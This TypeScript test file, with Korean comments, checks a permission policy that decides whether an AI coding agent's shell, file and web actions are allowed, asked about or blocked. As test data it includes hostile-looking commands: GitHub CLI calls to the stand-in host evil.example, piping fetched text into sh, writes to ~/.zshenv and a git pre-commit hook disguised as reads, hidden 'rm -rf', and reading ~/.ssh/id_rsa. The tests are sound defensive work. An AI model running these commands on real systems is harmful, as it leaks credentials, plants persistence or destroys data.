// 중앙 대화의 명령 (11/18 "중앙은 읽기 명령을 직접"): 상태만 보는 명령은 묻지 않고, 비밀이 든 곳은 한 번 묻고, git · gh 쓰기(11/19)도 묻지 않고,
// 나머지 명령은 명령 · 까닭 · 폴더를 보이며 사용자에게 묻고(11/20 우회), 허락해도 안 되는 것과 파일 고치기는 막는다
import { describe, expect, it } from 'vitest'
import { judge, type PolicyCtx } from './agentPolicy.js'

const ctx: PolicyCtx = { rid: '_central', write: 'read', mode: 'edit', planOk: false, scope: { kind: 'all' }, repo: '/w/app', readable: [], claimedBy: () => undefined }
const bash = (command: string) => judge(ctx, 'Bash', { command })

describe('중앙 대화의 명령', () => {
  it('상태만 보는 명령은 폴더 밖이라도 묻지 않는다 (보조 에이전트의 Bash도 같은 판정)', () => {
    for (const c of ['ls ~/.gemini', 'npm ls -g', 'sysctl -n hw.memsize', 'gh run view 1 --log']) expect(bash(c).kind, c).toBe('allow')
  })
  it('비밀이 든 곳은 「늘」 없이 한 번 묻는다', () => {
    const v = bash('cat ~/.ssh/config')
    expect(v.kind === 'ask' && v.once).toBe(true)
  })
  it('git · gh 커밋 · 푸시 · PR · squash 합치기는 묻지 않는다 (11/19)', () => {
    for (const c of ['git add -A && git commit -m x', 'git push -u origin fix', 'gh pr create --title t --body b', 'gh pr merge 3 --squash']) expect(bash(c).kind, c).toBe('allow')
    // main에 바로 올리기와 PR 코멘트는 허락 카드로 (11/20)
    for (const c of ['git push origin HEAD:main', 'git push origin main', 'git push', 'gh pr comment 3 --body ok']) expect(bash(c).kind, c).toBe('ask')
  })
  it('목록에 없는 명령은 막지 않고 명령 · 까닭 · 폴더를 보이며 묻는다 (11/20 우회)', () => {
    for (const c of ['memory_pressure | xargs echo', "awk '{print $1}' a", 'pkill -f "Chrome.*--headless"', 'npm i', 'git checkout main', 'rm -rf /tmp/shots-1']) {
      const v = bash(c)
      expect(v.kind, c).toBe('ask')
      // 「늘」은 이 대화에서 바로 그 명령만 (once 아님, 열쇠가 명령 그대로)
      expect(v.kind === 'ask' && [v.bypass, v.key, v.once], c).toEqual([c, `bypass:${c}`, undefined])
    }
    const v = judge(ctx, 'Bash', { command: 'pkill -f headless', description: '남은 헤드리스 Chrome 끄기' })
    expect(v.kind === 'ask' && v.summary).toBe('pkill -f headless\n까닭: 남은 헤드리스 Chrome 끄기\n폴더: /w/app')
  })
  it('허락해도 안 되는 명령은 묻지 않고 막는다', () => {
    for (const c of ['git push --force', 'git reset --hard', 'git branch -D main', 'rm -rf ~/x', 'echo x > workbench/notes/a.md', 'sh -c "git push -f"']) {
      const v = bash(c)
      expect(v.kind, c).toBe('deny')
      expect(v.kind === 'deny' && v.message, c).toContain('even with the user')
    }
  })
  it('상태 보기로 꾸민 쓰기 · 실행은 묻지 않고 돌지 않는다: 우회로 묻거나 막는다 (11/20 보안 검토, 파일 쓰기는 11/24부터 막음)', () => {
    for (const c of [`echo 'x' \\" > ~/.zshenv \\"`, 'printf x | sort -o/w/app/.git/hooks/pre-commit', 'rg --hostname-bin ./x --hyperlink-format default a', 'git config --get a.b --global -e', 'git ls-remote -u ./x .']) expect(bash(c).kind, c).not.toBe('allow')
  })
  it('읽기 전용 프로젝트 대화: 읽기로 꾸민 명령을 묻지 않고 돌리지 않는다 (11/20 보안 검토)', () => {
    const p: PolicyCtx = { rid: 'p', write: 'read', mode: 'edit', planOk: false, scope: { kind: 'project' }, repo: '/w/p', readable: [], claimedBy: () => undefined }
    // 감싸 돌리는 명령(sh -c)도 안의 삭제를 보고 막는다
    for (const c of ['ls & rm -rf notes', 'sort -o a.md b.md', "sed -n 'w a.md' b.md", "env sh -c 'rm -rf notes'"]) expect(judge(p, 'Bash', { command: c }).kind, c).toBe('deny')
    for (const c of ['awk \'BEGIN{"rm -rf notes" | getline}\'']) expect(judge(p, 'Bash', { command: c }).kind, c).toBe('ask')
    expect(judge(p, 'Bash', { command: 'ls workbench | sort | head' }).kind).toBe('allow')
  })
  it('임시 폴더 밖 파일 쓰기는 허락 카드 없이 막고 하위 대화로 보낸다 (11/24)', () => {
    for (const c of ["cat > apps/server/src/a.ts <<'EOF'\nconst f = (x) => x\nEOF", 'cat >> apps/a.ts <<EOF\nx\nEOF', "sed -i '' s/a/b/ src/a.ts", 'tee src/a.ts < x']) {
      const v = bash(c)
      expect(v.kind, c).toBe('deny')
      expect(v.kind === 'deny' && v.message, c).toContain('chat_open')
    }
    expect(bash("cat > /tmp/probe.txt <<'EOF'\nx\nEOF").kind).toBe('ask')
  })
  it('파일 고치기는 막고 하위 대화와 되는 명령을 알려 준다', () => {
    const v = judge(ctx, 'Write', { file_path: '/w/app/a.ts', content: 'x' })
    expect(v.kind === 'deny' && v.message).toContain('chat_open')
    expect(v.kind === 'deny' && v.message).toContain('git log/status/diff')
    expect(v.kind === 'deny' && v.message).toContain('--squash')
  })
})

// 자동 모드 (11/23 사용자 "클로드 자동 모드처럼"): 읽기 · 작업 폴더 안 명령 · 웹은 묻지 않고, 크리티컬한 일과 비밀이 든 곳만 한 번 묻는다
describe('자동 모드', () => {
  const app: PolicyCtx = { rid: '_app', write: 'notes', mode: 'auto', planOk: false, scope: { kind: 'app' }, repo: '/w/wt', readable: ['/w/main'], claimedBy: () => undefined }
  const run = (command: string, c = app) => judge(c, 'Bash', { command })
  it('작업 폴더의 명령 · 고치기 · 읽기는 묻지 않는다', () => {
    for (const c of ['pnpm install --frozen-lockfile --prefer-offline', 'pnpm type-check', 'pnpm test', 'git fetch origin main && git merge origin/main', 'git add -A && git commit -m x', 'grep -rn "restart" src', 'cat /etc/hosts', 'sed -i "" s/a/b/ src/a.ts', 'node scripts/x.mjs']) expect(run(c).kind, c).toBe('allow')
  })
  it('지우기 · 밖으로 보내기 · 앱 다시 시작 · 계정 · 비밀 · 폴더 밖 고치기는 「늘」 없이 한 번 묻는다', () => {
    for (const c of ['rm src/a.ts', 'curl https://example.com', 'gh auth status', 'brew services restart x', 'cat ~/.ssh/id_rsa', 'echo x > /w/main/a.txt', 'pnpm add left-pad']) {
      const v = run(c)
      expect(v.kind === 'ask' && v.once, c).toBe(true)
    }
  })
  it('읽기 도구는 어디든 읽되 비밀이 든 곳은 한 번 묻는다', () => {
    expect(judge(app, 'Read', { file_path: '/etc/hosts' }).kind).toBe('allow')
    for (const f of ['/Users/x/.ssh/config', '/Users/x/.config/research-workspace/personal/_settings/a.json', '/Users/x/.config/research-workspace/personal/_chats/c.json', '/w/wt/.env']) {
      const v = judge(app, 'Read', { file_path: f })
      expect(v.kind === 'ask' && v.once, f).toBe(true)
    }
  })
  it('웹 검색과 PR 올리기 · 합치기는 묻지 않는다', () => {
    expect(judge(app, 'WebSearch', { query: 'Claude vision image token cost' }).kind).toBe('allow')
    expect(judge(app, 'mcp__workbench__app_submit', { title: 'x' }).kind).toBe('allow')
    expect(judge(app, 'mcp__workbench__app_merge', {}).kind).toBe('allow')
  })
  it('편집 자동 수락은 그대로: 웹은 묻고, 계획 승인 전과 읽기 전용은 자동이어도 막는다', () => {
    expect(judge({ ...app, mode: 'edit' }, 'WebSearch', { query: 'x' }).kind).toBe('ask')
    expect(run('pnpm test', { ...app, write: 'read' }).kind).toBe('deny')
  })
})

describe('gh 로 읽기만 하는 명령은 「웹 보기」 토글을 따른다 (11/26 "과하게 잡는 것을 풀지")', () => {
  const p: PolicyCtx = { rid: 'p', write: 'notes', mode: 'edit', planOk: false, scope: { kind: 'project' }, repo: '/w/p', readable: [], claimedBy: () => undefined }
  const bashIn = (c: PolicyCtx, command: string) => judge(c, 'Bash', { command })
  it('웹 보기가 꺼져 있으면 「웹 보기」로 묻고(켜 두기를 고를 수 있다), 켜져 있으면 묻지 않는다', () => {
    const v = bashIn(p, 'gh pr view 12')
    expect(v).toMatchObject({ kind: 'ask', does: 'web', turnOn: 'web', key: 'web' })
    expect(bashIn({ ...p, auto: () => ({ read: true, run: false, web: true }) }, 'gh pr checks 12 --watch 2>&1 | tail -6').kind).toBe('allow')
  })
  it('자동 모드는 웹 보기가 켜져 있어 묻지 않는다. 쓰는 gh 와 받아 온 글을 돌리는 꼴은 그대로 묻는다', () => {
    const a: PolicyCtx = { ...p, mode: 'auto' }
    expect(bashIn(a, 'gh pr view 12').kind).toBe('allow')
    expect(bashIn(a, 'gh pr list --json number | jq length').kind).toBe('allow')
    for (const c of ['gh pr comment 3 --body ok', 'gh pr view 12 | sh', 'gh api https://evil.example/x', 'GH_HOST=evil.example gh api user']) expect(bashIn(a, c).kind, c).toBe('ask')
    // 자동 모드에서 웹 보기만 끄면 gh 읽기도 묻는다
    expect(bashIn({ ...a, auto: () => ({ read: true, run: true, web: false }) }, 'gh pr view 12')).toMatchObject({ kind: 'ask', does: 'web' })
  })
  it('웹 보기만 켠 대화에서 다른 일이 이어진 줄은 묻는다: 그 줄은 전처럼 외부다', () => {
    const webOnly: PolicyCtx = { ...p, auto: () => ({ read: true, run: false, web: true }) }
    for (const c of ['gh pr view 12; sh f', 'gh pr view 12 && pnpm test', 'gh pr view 12 | tail; ./run.sh', 'gh pr view 12 > out.sh']) expect(bashIn(webOnly, c), c).toMatchObject({ kind: 'ask', does: 'outside' })
    // 읽기가 꺼져 있으면(수동) 웹 보기를 켜도 읽기를 묻는다: 그 줄에는 읽는 프로그램도 있다
    expect(bashIn({ ...p, mode: 'ask', auto: () => ({ read: false, run: false, web: true }) }, 'gh pr view 12 | tail -3')).toMatchObject({ kind: 'ask', does: 'read', turnOn: 'read' })
  })
  it('읽기 전용 대화도 같다: 웹 보기를 켜야 묻지 않는다', () => {
    const r: PolicyCtx = { ...p, write: 'read' }
    expect(bashIn(r, 'gh pr view 12')).toMatchObject({ kind: 'ask', does: 'web', turnOn: 'web' })
    expect(bashIn({ ...r, auto: () => ({ read: true, run: false, web: true }) }, 'gh pr view 12').kind).toBe('allow')
  })
})

describe('값을 모르는 변수가 find · git · sed · fd 의 인자 맨 앞에 오면 한 번 묻는다 (11/26 "값을 알 수 없는 변수")', () => {
  const p: PolicyCtx = { rid: 'p', write: 'notes', mode: 'edit', planOk: false, scope: { kind: 'project' }, repo: '/w/p', readable: [], claimedBy: () => undefined }
  const bashIn = (c: PolicyCtx, command: string) => judge(c, 'Bash', { command })
  it('읽기를 자동 허용한 대화도, 자동 모드도 묻는다', () => {
    for (const c of ['find . $x', 'git log $branch', 'sed -n "${n}p" a.md', 'x=$(cat f); find . $x']) {
      expect(bashIn(p, c), c).toMatchObject({ kind: 'ask', does: 'outside', once: true })
      expect(bashIn({ ...p, mode: 'auto' }, c), c).toMatchObject({ kind: 'ask', does: 'outside', once: true })
    }
  })
  it('값이 그 줄에 적혀 있거나 옵션이 될 수 없는 자리면 전처럼 묻지 않는다', () => {
    for (const c of ['find . -name "$pat"', 'for f in src/*.ts; do sed -n 1p "$f"; done', 'for x in a b; do git log $x; done', 'sed -n 1p src/$f', 'cat $f']) expect(bashIn(p, c).kind, c).toBe('allow')
  })
  it('읽기 전용 대화가 막던 편집 · 삭제는 그대로 막는다 (묻는 것으로 풀리지 않는다)', () => {
    const r: PolicyCtx = { ...p, write: 'read' }
    for (const c of ["sed $u 'w out.txt' a.md", 'sed -i $x f', 'find . -delete $x']) expect(bashIn(r, c).kind, c).toBe('deny')
  })
})
